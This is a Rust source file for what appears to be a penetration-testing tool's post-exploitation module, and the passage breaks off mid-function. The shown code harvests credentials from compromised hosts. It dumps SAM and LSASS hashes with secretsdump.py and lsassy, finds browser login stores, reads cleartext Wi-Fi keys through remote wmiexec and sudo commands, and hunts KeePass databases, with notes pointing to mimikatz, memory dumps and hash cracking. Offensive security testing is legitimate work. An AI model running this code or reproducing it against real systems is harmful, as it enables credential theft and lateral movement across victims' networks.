// Post-Exploitation Module
// Credential harvesting, privilege escalation, persistence, and lateral movement
// Uses impacket tools for real implementations

use crate::scanner::exploitation::types::*;
use anyhow::{anyhow, Result};
use chrono::Utc;
use log::info;
use tokio::process::Command;
use std::time::Duration;
use std::collections::HashMap;

/// Helper to create a PostExploitFinding
fn make_finding(finding_type: &str, value: &str, severity: Severity) -> PostExploitFinding {
    PostExploitFinding {
        finding_type: finding_type.to_string(),
        value: value.to_string(),
        details: None,
        severity,
    }
}

/// Helper to create a PostExploitFinding with details
fn make_finding_with_details(
    finding_type: &str,
    value: &str,
    details: HashMap<String, serde_json::Value>,
    severity: Severity
) -> PostExploitFinding {
    PostExploitFinding {
        finding_type: finding_type.to_string(),
        value: value.to_string(),
        details: Some(details),
        severity,
    }
}

/// Run a post-exploitation module
pub async fn run_module(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!(
        "Running post-exploitation module {:?} against {}",
        config.module, config.target
    );

    let result = match config.module {
        // Credential Harvesting
        PostExploitModule::DumpSam => dump_sam(config).await,
        PostExploitModule::DumpLsass => dump_lsass(config).await,
        PostExploitModule::ExtractBrowserCreds => extract_browser_creds(config).await,
        PostExploitModule::ExtractWifiPasswords => extract_wifi_passwords(config).await,
        PostExploitModule::DumpKeePass => dump_keepass(config).await,
        PostExploitModule::ExtractSshKeys => extract_ssh_keys(config).await,
        PostExploitModule::DumpCredMan => dump_credman(config).await,

        // Privilege Escalation Checks
        PostExploitModule::CheckAlwaysInstallElevated => check_always_install_elevated(config).await,
        PostExploitModule::CheckUnquotedPaths => check_unquoted_paths(config).await,
        PostExploitModule::CheckWeakServicePerms => check_weak_service_perms(config).await,
        PostExploitModule::CheckSeImpersonate => check_se_impersonate(config).await,
        PostExploitModule::CheckSudoers => check_sudoers(config).await,
        PostExploitModule::CheckSuid => check_suid(config).await,
        PostExploitModule::CheckCapabilities => check_capabilities(config).await,

        // Persistence
        PostExploitModule::CreateScheduledTask => create_scheduled_task(config).await,
        PostExploitModule::AddRegistryRunKey => add_registry_run_key(config).await,
        PostExploitModule::CreateService => create_service(config).await,
        PostExploitModule::AddCronJob => add_cron_job(config).await,
        PostExploitModule::AddSshKey => add_ssh_key(config).await,
        PostExploitModule::WmiEventSub => create_wmi_event_sub(config).await,

        // Lateral Movement
        PostExploitModule::PassTheHash => pass_the_hash(config).await,
        PostExploitModule::PassTheTicket => pass_the_ticket(config).await,
        PostExploitModule::PsExec => psexec(config).await,
        PostExploitModule::WmiExec => wmiexec(config).await,
        PostExploitModule::SshPivot => ssh_pivot(config).await,
        PostExploitModule::RdpHijack => rdp_hijack(config).await,

        // Discovery
        PostExploitModule::NetworkShares => enumerate_network_shares(config).await,
        PostExploitModule::DomainUsers => enumerate_domain_users(config).await,
        PostExploitModule::LocalUsers => enumerate_local_users(config).await,
        PostExploitModule::InstalledSoftware => enumerate_installed_software(config).await,
        PostExploitModule::RunningProcesses => enumerate_running_processes(config).await,
    };

    result
}

// ============================================================================
// Credential Harvesting
// ============================================================================

async fn dump_sam(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Use impacket's secretsdump.py to extract SAM/SYSTEM hashes
    info!("Attempting to dump SAM database from {}", config.target);

    let creds = config.credentials.as_ref()
        .ok_or_else(|| anyhow!("Credentials required for SAM dump"))?;

    // Build credentials string for secretsdump.py
    let creds_str = build_impacket_creds(&creds, &config.target);

    let result = tokio::time::timeout(
        Duration::from_secs(120),
        Command::new("secretsdump.py")
            .args([&creds_str, "-just-dc-ntlm"])
            .output()
    ).await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            let combined = format!("{}{}", stdout, stderr);

            let mut findings = Vec::new();

            // Parse NTLM hashes from output
            // Format: domain\username:RID:LMHash:NTHash:::
            for line in stdout.lines() {
                if line.contains(":") && !line.starts_with("[") && !line.starts_with("Impacket") {
                    let parts: Vec<&str> = line.split(':').collect();
                    if parts.len() >= 4 {
                        let mut details = HashMap::new();
                        details.insert("user".to_string(), serde_json::json!(parts[0]));
                        details.insert("rid".to_string(), serde_json::json!(parts.get(1).unwrap_or(&"")));
                        details.insert("lm_hash".to_string(), serde_json::json!(parts.get(2).unwrap_or(&"")));
                        details.insert("nt_hash".to_string(), serde_json::json!(parts.get(3).unwrap_or(&"")));
                        findings.push(make_finding_with_details(
                            "ntlm_hash",
                            parts[0],
                            details,
                            Severity::High,
                        ));
                    }
                }
            }

            if combined.contains("error") || combined.contains("Access denied") {
                Ok(PostExploitResult {
                    module: PostExploitModule::DumpSam,
                    target: config.target.clone(),
                    success: false,
                    findings: vec![],
                    error: Some(format!("Access denied or error: {}", combined.chars().take(200).collect::<String>())),
                    timestamp: Utc::now(),
                })
            } else {
                info!("SAM dump completed - found {} hashes", findings.len());
                let has_findings = !findings.is_empty();
                Ok(PostExploitResult {
                    module: PostExploitModule::DumpSam,
                    target: config.target.clone(),
                    success: has_findings,
                    findings,
                    error: if has_findings { None } else { Some("No hashes extracted".to_string()) },
                    timestamp: Utc::now(),
                })
            }
        }
        Ok(Err(e)) => Ok(PostExploitResult {
            module: PostExploitModule::DumpSam,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some(format!("secretsdump.py not found or failed: {}. Install: pip install impacket", e)),
            timestamp: Utc::now(),
        }),
        Err(_) => Ok(PostExploitResult {
            module: PostExploitModule::DumpSam,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some("Timeout during SAM dump".to_string()),
            timestamp: Utc::now(),
        }),
    }
}

async fn dump_lsass(config: &PostExploitConfig) -> Result<PostExploitResult> {
    // Use lsassy or secretsdump for LSASS dump
    info!("Attempting to dump LSASS from {}", config.target);

    let creds = config.credentials.as_ref()
        .ok_or_else(|| anyhow!("Credentials required for LSASS dump"))?;

    // Try lsassy first (more reliable for LSASS)
    let lsassy_check = Command::new("which").arg("lsassy").output().await;

    if lsassy_check.is_ok() && lsassy_check.unwrap().status.success() {
        return dump_lsass_with_lsassy(config, creds).await;
    }

    // Fallback to secretsdump with NTDS extraction
    let creds_str = build_impacket_creds(&creds, &config.target);

    let result = tokio::time::timeout(
        Duration::from_secs(180),
        Command::new("secretsdump.py")
            .args([&creds_str])
            .output()
    ).await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let mut findings = Vec::new();

            for line in stdout.lines() {
                if line.contains(":") && (line.contains(":::") || line.contains("aes256")) {
                    findings.push(make_finding("credential", line, Severity::High));
                }
            }

            Ok(PostExploitResult {
                module: PostExploitModule::DumpLsass,
                target: config.target.clone(),
                success: !findings.is_empty(),
                findings,
                error: None,
                timestamp: Utc::now(),
            })
        }
        Ok(Err(e)) => Ok(PostExploitResult {
            module: PostExploitModule::DumpLsass,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some(format!("Failed: {}. Install lsassy or impacket", e)),
            timestamp: Utc::now(),
        }),
        Err(_) => Ok(PostExploitResult {
            module: PostExploitModule::DumpLsass,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some("Timeout".to_string()),
            timestamp: Utc::now(),
        }),
    }
}

async fn dump_lsass_with_lsassy(config: &PostExploitConfig, creds: &Credentials) -> Result<PostExploitResult> {
    let mut args = vec![
        "-u".to_string(), creds.username.clone(),
        config.target.clone(),
    ];

    if let Some(ref password) = creds.password {
        args.push("-p".to_string());
        args.push(password.clone());
    } else if let Some(ref hash) = creds.ntlm_hash {
        args.push("-H".to_string());
        args.push(hash.clone());
    }

    if let Some(ref domain) = creds.domain {
        args.push("-d".to_string());
        args.push(domain.clone());
    }

    let result = tokio::time::timeout(
        Duration::from_secs(120),
        Command::new("lsassy")
            .args(&args)
            .output()
    ).await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let mut findings = Vec::new();

            // lsassy outputs credentials in a table format
            for line in stdout.lines() {
                if line.contains("NT:") || line.contains("SHA1:") || line.contains("Password:") {
                    findings.push(make_finding("lsass_credential", line.trim(), Severity::Critical));
                }
            }

            Ok(PostExploitResult {
                module: PostExploitModule::DumpLsass,
                target: config.target.clone(),
                success: !findings.is_empty(),
                findings,
                error: None,
                timestamp: Utc::now(),
            })
        }
        _ => Ok(PostExploitResult {
            module: PostExploitModule::DumpLsass,
            target: config.target.clone(),
            success: false,
            findings: vec![],
            error: Some("lsassy failed".to_string()),
            timestamp: Utc::now(),
        }),
    }
}

/// Build impacket credentials string: domain/user:password@target or domain/user@target -hashes :hash
fn build_impacket_creds(creds: &Credentials, target: &str) -> String {
    let domain = creds.domain.as_deref().unwrap_or("");
    if let Some(ref password) = creds.password {
        if domain.is_empty() {
            format!("{}:{}@{}", creds.username, password, target)
        } else {
            format!("{}/{}:{}@{}", domain, creds.username, password, target)
        }
    } else if let Some(ref hash) = creds.ntlm_hash {
        if domain.is_empty() {
            format!("{}@{} -hashes :{}", creds.username, target, hash)
        } else {
            format!("{}/{}@{} -hashes :{}", domain, creds.username, target, hash)
        }
    } else {
        format!("{}@{}", creds.username, target)
    }
}

async fn extract_browser_creds(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Extracting browser credentials from {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    if is_local {
        return extract_browser_creds_local().await;
    }

    // For remote extraction, use credentials to execute commands
    let creds = match config.credentials.as_ref() {
        Some(c) => c,
        None => {
            return Ok(PostExploitResult {
                module: PostExploitModule::ExtractBrowserCreds,
                target: config.target.clone(),
                success: false,
                findings: vec![],
                error: Some("Credentials required for remote browser credential extraction".to_string()),
                timestamp: Utc::now(),
            });
        }
    };

    let mut findings = Vec::new();

    // Try to detect OS and use appropriate method
    // For Windows: use wmiexec/psexec to list browser data files
    // For Linux: use SSH

    // Check if Windows target by trying WMI
    let creds_str = build_impacket_creds(&creds, &config.target);
    let win_check = tokio::time::timeout(
        Duration::from_secs(15),
        Command::new("wmiexec.py")
            .args([&creds_str, "whoami"])
            .output()
    ).await;

    let is_windows = win_check.is_ok() &&
                     win_check.as_ref().unwrap().is_ok() &&
                     win_check.as_ref().unwrap().as_ref().unwrap().status.success();

    if is_windows {
        // Windows browser credential locations
        let win_paths = vec![
            // Chrome
            (r#"dir "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" 2>nul"#, "Chrome", "Login Data"),
            (r#"dir "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies" 2>nul"#, "Chrome", "Cookies"),
            // Edge
            (r#"dir "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data" 2>nul"#, "Edge", "Login Data"),
            // Firefox
            (r#"dir "%APPDATA%\Mozilla\Firefox\Profiles\*\logins.json" 2>nul"#, "Firefox", "logins.json"),
            (r#"dir "%APPDATA%\Mozilla\Firefox\Profiles\*\key4.db" 2>nul"#, "Firefox", "key4.db"),
        ];

        for (cmd, browser, file_type) in &win_paths {
            let result = tokio::time::timeout(
                Duration::from_secs(20),
                Command::new("wmiexec.py")
                    .args([creds_str.as_str(), *cmd])
                    .output()
            ).await;

            if let Ok(Ok(output)) = result {
                let stdout = String::from_utf8_lossy(&output.stdout);
                if !stdout.contains("File Not Found") && !stdout.contains("cannot find") {
                    let mut details = HashMap::new();
                    details.insert("browser".to_string(), serde_json::json!(browser));
                    details.insert("file_type".to_string(), serde_json::json!(file_type));
                    details.insert("location".to_string(), serde_json::json!("Windows credential store"));
                    details.insert("note".to_string(), serde_json::json!(
                        "Credential file found. Use tools like mimikatz or LaZagne for extraction."
                    ));

                    findings.push(make_finding_with_details(
                        "browser_cred_file",
                        &format!("{} - {}", browser, file_type),
                        details,
                        Severity::High,
                    ));
                }
            }
        }
    } else {
        // Linux/macOS browser credential locations
        let linux_paths = vec![
            // Chrome
            ("~/.config/google-chrome/Default/Login Data", "Chrome", "Login Data"),
            ("~/.config/chromium/Default/Login Data", "Chromium", "Login Data"),
            // Firefox
            ("~/.mozilla/firefox/*.default*/logins.json", "Firefox", "logins.json"),
            ("~/.mozilla/firefox/*.default*/key4.db", "Firefox", "key4.db"),
        ];

        for (path, browser, file_type) in &linux_paths {
            let ssh_cmd = format!("ls {} 2>/dev/null | head -1", path);

            let mut ssh_args = vec![
                "-o".to_string(), "StrictHostKeyChecking=no".to_string(),
                "-o".to_string(), "BatchMode=yes".to_string(),
                "-o".to_string(), "ConnectTimeout=10".to_string(),
            ];

            let cmd_name = if creds.password.is_some() {
                ssh_args.insert(0, creds.password.as_ref().unwrap().clone());
                ssh_args.insert(0, "-p".to_string());
                "sshpass"
            } else {
                "ssh"
            };

            ssh_args.push(format!("{}@{}", creds.username, config.target));
            ssh_args.push(ssh_cmd);

            let result = tokio::time::timeout(
                Duration::from_secs(15),
                Command::new(cmd_name)
                    .args(&ssh_args)
                    .output()
            ).await;

            if let Ok(Ok(output)) = result {
                let stdout = String::from_utf8_lossy(&output.stdout);
                if !stdout.is_empty() && !stdout.contains("No such file") {
                    let mut details = HashMap::new();
                    details.insert("browser".to_string(), serde_json::json!(browser));
                    details.insert("file_type".to_string(), serde_json::json!(file_type));
                    details.insert("path".to_string(), serde_json::json!(stdout.trim()));

                    findings.push(make_finding_with_details(
                        "browser_cred_file",
                        &format!("{} - {}", browser, file_type),
                        details,
                        Severity::High,
                    ));
                }
            }
        }
    }

    let success = !findings.is_empty();
    Ok(PostExploitResult {
        module: PostExploitModule::ExtractBrowserCreds,
        target: config.target.clone(),
        success,
        findings,
        error: if success { None } else { Some("No browser credential files found or access denied".to_string()) },
        timestamp: Utc::now(),
    })
}

/// Local browser credential extraction
async fn extract_browser_creds_local() -> Result<PostExploitResult> {
    let mut findings = Vec::new();

    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".to_string());

    // Linux/macOS paths
    let paths = vec![
        // Chrome
        (format!("{}/.config/google-chrome/Default/Login Data", home), "Chrome", "Login Data (SQLite)"),
        (format!("{}/.config/google-chrome/Default/Cookies", home), "Chrome", "Cookies (SQLite)"),
        // Chromium
        (format!("{}/.config/chromium/Default/Login Data", home), "Chromium", "Login Data (SQLite)"),
        // Firefox
        (format!("{}/.mozilla/firefox", home), "Firefox", "Profile Directory"),
    ];

    for (path, browser, file_type) in &paths {
        let path_obj = std::path::Path::new(path);
        if path_obj.exists() {
            let mut details = HashMap::new();
            details.insert("browser".to_string(), serde_json::json!(browser));
            details.insert("file_type".to_string(), serde_json::json!(file_type));
            details.insert("path".to_string(), serde_json::json!(path));

            // For Firefox, look for actual profile directories
            if *browser == "Firefox" && path_obj.is_dir() {
                if let Ok(entries) = std::fs::read_dir(path_obj) {
                    for entry in entries.flatten() {
                        let entry_name = entry.file_name().to_string_lossy().to_string();
                        if entry_name.ends_with(".default") || entry_name.ends_with(".default-release") {
                            let profile_path = entry.path();
                            let logins_path = profile_path.join("logins.json");
                            let key_path = profile_path.join("key4.db");

                            if logins_path.exists() {
                                let mut login_details = HashMap::new();
                                login_details.insert("browser".to_string(), serde_json::json!("Firefox"));
                                login_details.insert("file_type".to_string(), serde_json::json!("logins.json"));
                                login_details.insert("path".to_string(), serde_json::json!(logins_path.display().to_string()));
                                login_details.insert("profile".to_string(), serde_json::json!(entry_name.clone()));

                                findings.push(make_finding_with_details(
                                    "browser_cred_file",
                                    &format!("Firefox - {} - logins.json", entry_name),
                                    login_details,
                                    Severity::High,
                                ));
                            }

                            if key_path.exists() {
                                let mut key_details = HashMap::new();
                                key_details.insert("browser".to_string(), serde_json::json!("Firefox"));
                                key_details.insert("file_type".to_string(), serde_json::json!("key4.db (encryption key)"));
                                key_details.insert("path".to_string(), serde_json::json!(key_path.display().to_string()));
                                key_details.insert("profile".to_string(), serde_json::json!(entry_name.clone()));

                                findings.push(make_finding_with_details(
                                    "browser_key_file",
                                    &format!("Firefox - {} - key4.db", entry_name),
                                    key_details,
                                    Severity::Critical,
                                ));
                            }
                        }
                    }
                }
                continue;
            }

            // Check if it's a SQLite database (Chrome/Chromium)
            if file_type.contains("SQLite") && path_obj.is_file() {
                // Try to read first bytes to verify it's SQLite
                if let Ok(bytes) = std::fs::read(path_obj) {
                    if bytes.len() > 16 && &bytes[0..6] == b"SQLite" {
                        details.insert("format".to_string(), serde_json::json!("SQLite"));
                        details.insert("size".to_string(), serde_json::json!(bytes.len()));
                        details.insert("note".to_string(), serde_json::json!(
                            "Use sqlite3 to read. Chrome credentials require DPAPI decryption."
                        ));
                    }
                }
            }

            findings.push(make_finding_with_details(
                "browser_cred_file",
                &format!("{} - {}", browser, file_type),
                details,
                Severity::High,
            ));
        }
    }

    let success = !findings.is_empty();
    Ok(PostExploitResult {
        module: PostExploitModule::ExtractBrowserCreds,
        target: "localhost".to_string(),
        success,
        findings,
        error: if success { None } else { Some("No browser credential files found".to_string()) },
        timestamp: Utc::now(),
    })
}

async fn extract_wifi_passwords(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Extracting WiFi passwords from {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    if is_local {
        return extract_wifi_passwords_local().await;
    }

    // For remote extraction
    let creds = match config.credentials.as_ref() {
        Some(c) => c,
        None => {
            return Ok(PostExploitResult {
                module: PostExploitModule::ExtractWifiPasswords,
                target: config.target.clone(),
                success: false,
                findings: vec![],
                error: Some("Credentials required for remote WiFi password extraction".to_string()),
                timestamp: Utc::now(),
            });
        }
    };

    let mut findings = Vec::new();

    // Try Windows first via WMI
    let creds_str = build_impacket_creds(&creds, &config.target);
    let win_check = tokio::time::timeout(
        Duration::from_secs(15),
        Command::new("wmiexec.py")
            .args([&creds_str, "netsh wlan show profiles"])
            .output()
    ).await;

    if let Ok(Ok(output)) = win_check {
        let stdout = String::from_utf8_lossy(&output.stdout);

        if stdout.contains("All User Profile") || stdout.contains("User Profile") {
            // Extract profile names from the output
            for line in stdout.lines() {
                if line.contains("All User Profile") || line.contains("User Profile") {
                    if let Some(profile_name) = line.split(':').nth(1) {
                        let ssid = profile_name.trim();
                        if ssid.is_empty() {
                            continue;
                        }

                        // Get the password for this profile
                        let key_cmd = format!(
                            r#"netsh wlan show profile name="{}" key=clear"#,
                            ssid
                        );

                        let key_result = tokio::time::timeout(
                            Duration::from_secs(15),
                            Command::new("wmiexec.py")
                                .args([&creds_str, &key_cmd])
                                .output()
                        ).await;

                        if let Ok(Ok(key_output)) = key_result {
                            let key_stdout = String::from_utf8_lossy(&key_output.stdout);

                            // Parse key content
                            let mut password = None;
                            let mut auth_type = "Unknown";
                            let mut cipher = "Unknown";

                            for key_line in key_stdout.lines() {
                                if key_line.contains("Key Content") {
                                    password = key_line.split(':').nth(1).map(|s| s.trim().to_string());
                                } else if key_line.contains("Authentication") {
                                    auth_type = key_line.split(':').nth(1).unwrap_or("Unknown").trim();
                                } else if key_line.contains("Cipher") && !key_line.contains("Unicast") {
                                    cipher = key_line.split(':').nth(1).unwrap_or("Unknown").trim();
                                }
                            }

                            let mut details = HashMap::new();
                            details.insert("ssid".to_string(), serde_json::json!(ssid));
                            details.insert("authentication".to_string(), serde_json::json!(auth_type));
                            details.insert("cipher".to_string(), serde_json::json!(cipher));

                            if let Some(ref pwd) = password {
                                // Partially redact the password for safety
                                let redacted = if pwd.len() > 4 {
                                    format!("{}***{}", &pwd[..2], &pwd[pwd.len()-2..])
                                } else {
                                    "****".to_string()
                                };
                                details.insert("password_preview".to_string(), serde_json::json!(redacted));
                                details.insert("has_password".to_string(), serde_json::json!(true));

                                findings.push(make_finding_with_details(
                                    "wifi_password",
                                    ssid,
                                    details,
                                    Severity::High,
                                ));
                            } else {
                                details.insert("has_password".to_string(), serde_json::json!(false));
                                findings.push(make_finding_with_details(
                                    "wifi_profile",
                                    ssid,
                                    details,
                                    Severity::Low,
                                ));
                            }
                        }
                    }
                }
            }

            let success = !findings.is_empty();
            return Ok(PostExploitResult {
                module: PostExploitModule::ExtractWifiPasswords,
                target: config.target.clone(),
                success,
                findings,
                error: if success { None } else { Some("No WiFi profiles found".to_string()) },
                timestamp: Utc::now(),
            });
        }
    }

    // Try Linux via SSH
    let ssh_cmd = "sudo cat /etc/NetworkManager/system-connections/* 2>/dev/null || cat /etc/NetworkManager/system-connections/* 2>/dev/null";

    let mut ssh_args = vec![
        "-o".to_string(), "StrictHostKeyChecking=no".to_string(),
        "-o".to_string(), "BatchMode=yes".to_string(),
        "-o".to_string(), "ConnectTimeout=10".to_string(),
    ];

    let cmd_name = if creds.password.is_some() {
        ssh_args.insert(0, creds.password.as_ref().unwrap().clone());
        ssh_args.insert(0, "-p".to_string());
        "sshpass"
    } else {
        "ssh"
    };

    ssh_args.push(format!("{}@{}", creds.username, config.target));
    ssh_args.push(ssh_cmd.to_string());

    let result = tokio::time::timeout(
        Duration::from_secs(20),
        Command::new(cmd_name)
            .args(&ssh_args)
            .output()
    ).await;

    if let Ok(Ok(output)) = result {
        let stdout = String::from_utf8_lossy(&output.stdout);

        // Parse NetworkManager connection files
        let mut current_ssid = String::new();

        for line in stdout.lines() {
            if line.starts_with("ssid=") {
                current_ssid = line[5..].to_string();
            } else if line.starts_with("psk=") {
                let psk = line[4..].to_string();

                if !current_ssid.is_empty() {
                    let mut details = HashMap::new();
                    details.insert("ssid".to_string(), serde_json::json!(&current_ssid));

                    let redacted = if psk.len() > 4 {
                        format!("{}***{}", &psk[..2], &psk[psk.len()-2..])
                    } else {
                        "****".to_string()
                    };
                    details.insert("password_preview".to_string(), serde_json::json!(redacted));
                    details.insert("has_password".to_string(), serde_json::json!(true));

                    findings.push(make_finding_with_details(
                        "wifi_password",
                        &current_ssid,
                        details,
                        Severity::High,
                    ));

                    current_ssid.clear();
                }
            }
        }
    }

    let success = !findings.is_empty();
    Ok(PostExploitResult {
        module: PostExploitModule::ExtractWifiPasswords,
        target: config.target.clone(),
        success,
        findings,
        error: if success { None } else { Some("No WiFi passwords found or access denied".to_string()) },
        timestamp: Utc::now(),
    })
}

/// Local WiFi password extraction
async fn extract_wifi_passwords_local() -> Result<PostExploitResult> {
    let mut findings = Vec::new();

    // Try Linux NetworkManager first
    let nm_path = std::path::Path::new("/etc/NetworkManager/system-connections");
    if nm_path.exists() {
        if let Ok(entries) = std::fs::read_dir(nm_path) {
            for entry in entries.flatten() {
                let file_path = entry.path();
                if let Ok(content) = tokio::fs::read_to_string(&file_path).await {
                    let mut ssid = String::new();
                    let mut psk = None;
                    let mut key_mgmt = "Unknown";

                    for line in content.lines() {
                        if line.starts_with("ssid=") {
                            ssid = line[5..].to_string();
                        } else if line.starts_with("psk=") {
                            psk = Some(line[4..].to_string());
                        } else if line.starts_with("key-mgmt=") {
                            key_mgmt = line[9..].trim();
                        }
                    }

                    if !ssid.is_empty() {
                        let mut details = HashMap::new();
                        details.insert("ssid".to_string(), serde_json::json!(&ssid));
                        details.insert("key_management".to_string(), serde_json::json!(key_mgmt));
                        details.insert("config_file".to_string(), serde_json::json!(file_path.display().to_string()));

                        if let Some(ref p) = psk {
                            let redacted = if p.len() > 4 {
                                format!("{}***{}", &p[..2], &p[p.len()-2..])
                            } else {
                                "****".to_string()
                            };
                            details.insert("password_preview".to_string(), serde_json::json!(redacted));
                            details.insert("has_password".to_string(), serde_json::json!(true));

                            findings.push(make_finding_with_details(
                                "wifi_password",
                                &ssid,
                                details,
                                Severity::High,
                            ));
                        } else {
                            details.insert("has_password".to_string(), serde_json::json!(false));
                            findings.push(make_finding_with_details(
                                "wifi_profile",
                                &ssid,
                                details,
                                Severity::Low,
                            ));
                        }
                    }
                }
            }
        }
    }

    // Try wpa_supplicant config
    let wpa_paths = vec![
        "/etc/wpa_supplicant/wpa_supplicant.conf",
        "/etc/wpa_supplicant.conf",
    ];

    for wpa_path in &wpa_paths {
        if let Ok(content) = tokio::fs::read_to_string(wpa_path).await {
            let mut in_network = false;
            let mut ssid = String::new();
            let mut psk: Option<String> = None;

            for line in content.lines() {
                let trimmed = line.trim();
                if trimmed == "network={" {
                    in_network = true;
                    ssid.clear();
                    psk = None;
                } else if trimmed == "}" && in_network {
                    in_network = false;
                    if !ssid.is_empty() {
                        let mut details = HashMap::new();
                        details.insert("ssid".to_string(), serde_json::json!(&ssid));
                        details.insert("source".to_string(), serde_json::json!("wpa_supplicant"));

                        if let Some(ref p) = psk {
                            let redacted = if p.len() > 4 {
                                format!("{}***{}", &p[..2], &p[p.len()-2..])
                            } else {
                                "****".to_string()
                            };
                            details.insert("password_preview".to_string(), serde_json::json!(redacted));

                            findings.push(make_finding_with_details(
                                "wifi_password",
                                &ssid,
                                details,
                                Severity::High,
                            ));
                        }
                    }
                } else if in_network {
                    if trimmed.starts_with("ssid=") {
                        ssid = trimmed[5..].trim_matches('"').to_string();
                    } else if trimmed.starts_with("psk=") {
                        psk = Some(trimmed[4..].trim_matches('"').to_string());
                    }
                }
            }
        }
    }

    let success = !findings.is_empty();
    Ok(PostExploitResult {
        module: PostExploitModule::ExtractWifiPasswords,
        target: "localhost".to_string(),
        success,
        findings,
        error: if success { None } else { Some("No WiFi passwords found. May require root access.".to_string()) },
        timestamp: Utc::now(),
    })
}

async fn dump_keepass(config: &PostExploitConfig) -> Result<PostExploitResult> {
    info!("Attempting to dump KeePass from {}", config.target);

    let is_local = config.target == "localhost" ||
                   config.target == "127.0.0.1" ||
                   config.target == "::1";

    let mut findings = Vec::new();

    if is_local {
        // Local KeePass database discovery
        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".to_string());

        // Common KeePass database locations
        let search_dirs = vec![
            home.clone(),
            format!("{}/Documents", home),
            format!("{}/Desktop", home),
            format!("{}/Downloads", home),
            format!("{}/.keepass", home),
            "/home".to_string(),
        ];

        for dir in &search_dirs {
            let path = std::path::Path::new(dir);
            if !path.exists() {
                continue;
            }

            // Use find command to locate .kdbx files
            let result = Command::new("find")
                .args([dir, "-name", "*.kdbx", "-o", "-name", "*.kdb"])
                .arg("-maxdepth")
                .arg("5")
                .output()
                .await;

            if let Ok(output) = result {
                let stdout = String::from_utf8_lossy(&output.stdout);
                for db_path in stdout.lines() {
                    if !db_path.is_empty() {
                        let mut details = HashMap::new();
                        details.insert("path".to_string(), serde_json::json!(db_path));
                        details.insert("type".to_string(), serde_json::json!("KeePass database"));
                        details.insert("note".to_string(), serde_json::json!(
                            "Database found. Use keepass2john for hash extraction, then hashcat/john for cracking."
                        ));

                        // Check if it's a KeePass 1.x or 2.x database
                        let format = if db_path.ends_with(".kdb") {
                            "KeePass 1.x"
                        } else {
                            "KeePass 2.x"
                        };
                        details.insert("format".to_string(), serde_json::json!(format));

                        // Check file size
                        if let Ok(metadata) = std::fs::metadata(db_path) {
                            details.insert("size".to_string(), serde_json::json!(metadata.len()));
                        }

                        findings.push(make_finding_with_details(
                            "keepass_database",
                            db_path,
                            details,
                            Severity::High,
                        ));
                    }
                }
            }
        }

        // Also check for KeePass process (might have key in memory)
        let ps_result = Command::new("pgrep")
            .args(["-a", "-i", "keepass"])
            .output()
            .await;

        if let Ok(output) = ps_result {
            let stdout = String::from_utf8_lossy(&output.stdout);
            if !stdout.is_empty() {
                let mut details = HashMap::new();
                details.insert("processes".to_string(), serde_json::json!(stdout.trim()));
                details.insert("note".to_string(), serde_json::json!(
                    "KeePass is running. Consider memory dump for potential key extraction."
                ));

                findings.push(make_finding_with_details(
                    "keepass_process",
                    "KeePass running",
                    details,
                    Severity::Critical,
                ));
            }
        }
    } else {
        // Remote KeePass database discovery
        let creds = match config.credentials.as_ref() {
            Some(c) => c,
            None => {
                return Ok(PostExploitResult {
                    module: PostExploitModule::DumpKeePass,
                    target: config.target.clone(),
                    success: false,
                    findings: vec![],
                    error: Some("Credentials required for remote KeePass discovery".to_string()),
                    timestamp: Utc::now(),
                });
            }
        };

        // Try Windows
        let creds_str = build_impacket_creds(&creds, &config.target);
        let win_cmd = r#"dir /s /b C:\Users\*.kdbx C:\Users\*.kdb 2>nul"#;

        let result = tokio::time::timeout(
            Duration::from_secs(60),
            Command::new("wmiexec.py")
                .args([&creds_str, win_cmd])
                .output()
        ).await;

        if let Ok(Ok(output)) = result {
            let stdout = String::from_utf8_lossy(&output.stdout);
            for db_path in stdout.lines() {
                if db_path.contains(".kdb") {
                    let mut details = HashMap::new();
                    details.insert("path".to_string(), serde_json::json!(db_path.trim()));
                    details.insert("type".to_string(), serde_json::json!("KeePass database"));

                    findings.push(make_finding_with_details(
                        "keepass_database",
                        db_path.trim(),
                        details,
                        Severity::High,
                    ));
                }
            }
        }

        // Also try SSH for Linux targets
        let ssh_cmd = "find /home /root -name '*.kdbx' -o -name '*.kdb' 2>/dev/null | head -20";

        let mut ssh_args = vec![
            "-o".to_string(), "StrictHostKeyChecking=no".to_string(),
            "-o".to_string(), "BatchMode=yes".to_string(),
            "-o".to_string(), "ConnectTimeout=10".to_string(),
        ];

        let cmd_name = if creds.password.is_some() {
            ssh_args.insert(0, creds.password.as_ref().unwrap().clone());
            ssh_args.insert(0, "-p".to_string());
            "sshpass"
        } else {
            "ssh"
        };

        ssh_args.push(format!("{}@{}", creds.username, config.target));
        ssh_args.push(ssh_cmd.to_string());

        let ssh_result = tokio::time::timeout(
            Duration::from_secs(30),
            Command::new(cmd_name)
                .args(&ssh_args)
                .output()
        ).await;

        if let Ok(Ok(output)) = ssh_result {
            let stdout = String::from_utf8_lossy(&output.stdout);
            for db_path in stdout.lines() {
                if !db_path.is_empty() {
                    let mut details = HashMap::new();
                    details.insert("path".to_string(), serde_json::json!(db_path.trim()));
                    details.insert("type".to_string(), serde_json::json!("KeePass database"));

                    findings.push(make_finding_with_details(
                        "keepass_database",
                        db_path.trim(),
                        details,
                        Severity::High,
                    ));
                }
            }
        }
    }

    let success = !findings.is_empty();
    Ok(PostExploitResult {
